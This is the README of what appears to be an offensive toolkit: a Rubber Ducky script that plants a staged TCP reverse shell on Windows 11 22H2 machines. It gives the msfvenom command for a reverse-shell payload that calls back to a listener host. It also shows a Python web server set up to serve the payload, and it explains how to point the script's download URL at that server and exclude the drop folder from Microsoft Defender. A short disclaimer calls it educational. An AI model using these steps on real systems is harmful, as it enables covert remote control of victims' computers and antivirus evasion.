# README

This code does not promote or encourage any illegal activities. The content in this document is provided solely for
educational purposes and to create awareness.

# Staged TCP Reverse Shell with Rubber Ducky script within Windows Terminal

Since Microsoft pushed the latest 22H2 up-date for Windows 11 all Powershell reverse shell payloads have stopped working. Microsoft made changes to the way commandline tools are being opened. Everything will be opened in the new "Windows Terminal" and the "powershell -nop -noni -W hidden" commands are not working anymore.

This Reverse Shell script is tested on the latest Windows version and is working properly.

Requirements:

- The executable itself - Step 1
- HTTP server to host the shell executable - Step 2

## 1 - craft malicious executable

I'm using a Staged Meterpreter TCP reverse shell executable. To craft one you can use "msfvenom" with the following command:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-LISTENER] LPORT=[PORT-LISTENER] -f exe > payload.exe`

Change the LHOST and LPORT to your own listener server.

## 2- ducky script and execute

Within your linux box navigate to the shell.exe location. I'm using a Python webserver to host the executable so I can use this URL in the script to download the exe file:

`python3 -m http.server 80`

Next, change the variables in the script:

- LINE 25 === VARIABLES
  Changing the paths is optional. I'm using C:\temp to create the folder and exclude it withint MS Defender. If you want a different path or executable name you can change them
- LINE 36 === URL
  This one is important because the target computers needs to download your crafted executable. Fill in the URL of your HTTP server and specify the folder/filename
